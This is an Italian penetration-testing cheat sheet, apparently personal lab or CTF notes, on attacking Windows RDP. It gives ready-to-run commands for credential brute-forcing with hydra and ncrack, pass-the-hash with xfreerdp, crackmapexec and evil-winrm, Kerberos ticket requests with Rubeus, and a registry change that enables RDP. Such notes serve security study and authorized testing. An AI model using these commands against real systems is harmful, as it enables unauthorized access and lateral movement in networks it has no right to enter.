---

---
#Exploitation_porte

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione del Servizio]]
- [[#Bruteforce e Credenziali deboli]]
- [[#Accesso con Hash o Ticket]]
- [[#Pass-the-Hash / Kerberos]]
- [[#Attivare RDP su Windows]]

---
---
---
### Introduzione

_RDP (Remote Desktop Protocol)_ √® un protocollo sviluppato da Microsoft per accedere in modo remoto a un desktop Windows tramite interfaccia grafica.  
Opera **sulla porta TCP/3389** e rappresenta un obiettivo critico in fase di post-sfruttamento, movimento laterale o initial access (es. exposed RDP + credenziali deboli).

---
### Bruteforce e Credenziali deboli
Test di autenticazione via RDP:

```
hydra -l Administrator -P rockyou.txt rdp://target.com
```

```
ncrack -vv --user admin -P passwords.txt rdp://target.com
```

‚ö†Ô∏è Se `Network Level Authentication (NLA)` √® attiva, solo utenti validi riceveranno richiesta password.  
Pu√≤ essere utile per _user enumeration_.

---
### Accesso con Hash o Ticket
Se hai un hash NTLM o un *TGT Kerberos*, puoi autenticarti via:

```
xfreerdp /v:target /u:user /pth:<NTLMHASH>
```

- *Rubeus* per impersonazione TGT/TGS:

```
Rubeus asktgt /user:user /rc4:HASH /domain:target.local
```

> [!ATTENTION]
> L'accesso con GUI potrebbe portare ad informazioni utili come *user enumeration* (writeup: [[Windows#Escape| Escape]]):
> 
> ```
> xfreerdp3 /v:IP_TARGET /sec:nla
> ```
> 

---
### Pass-the-Hash / Kerberos
Con hash NTLM valido:

```
crackmapexec smb target.com -u user -H <NTLM> --exec-method smbexec
```

Con `evil-winrm`:

```
evil-winrm -i target.com -u user -H <NTLM>
```

Successivamente, si pu√≤ ottenere **accesso RDP** attivando l‚Äôutente nel gruppo `Remote Desktop Users`.

---
### Attivare RDP su Windows
Per attivare il protocollo RDP su Windows utilizziamo il seguente comando:

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

üìö Writeups:
- *Linux:*[[Network#Medtech | Medtech]],